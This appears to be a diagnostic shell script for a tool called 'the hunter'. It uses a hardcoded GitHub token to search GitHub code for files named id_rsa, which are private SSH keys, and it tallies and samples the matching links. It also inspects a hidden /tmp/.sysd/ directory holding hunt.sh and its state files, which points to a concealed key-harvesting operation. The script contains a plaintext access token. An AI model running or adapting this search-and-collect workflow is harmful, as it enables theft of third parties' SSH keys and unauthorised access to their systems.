#!/bin/sh
# throwaway diagnostic for the hunter
T=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
curl -s -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
  'https://api.github.com/search/code?q=filename:id_rsa&per_page=20' > /tmp/srch.json
echo "== json_bytes =="         ; wc -c < /tmp/srch.json
echo "== html_url_lines =="     ; grep -c 'html_url' /tmp/srch.json
echo "== all_html_url_matches ==" ; grep -oE '"html_url": *"[^"]+"' /tmp/srch.json | wc -l
echo "== blob_url_count =="     ; grep -oE '"html_url": *"[^"]+"' /tmp/srch.json | grep -c '/blob/'
echo "== nonblob_sample =="     ; grep -oE '"html_url": *"[^"]+"' /tmp/srch.json | grep -v '/blob/' | head -4
echo "== blob_sample =="        ; grep -oE '"html_url": *"[^"]+"' /tmp/srch.json | grep '/blob/' | head -4
echo "== hunt_sh_sha =="        ; sha256sum /tmp/.sysd/hunt.sh
echo "== state_dir =="          ; ls -la /tmp/.sysd/.hunt/
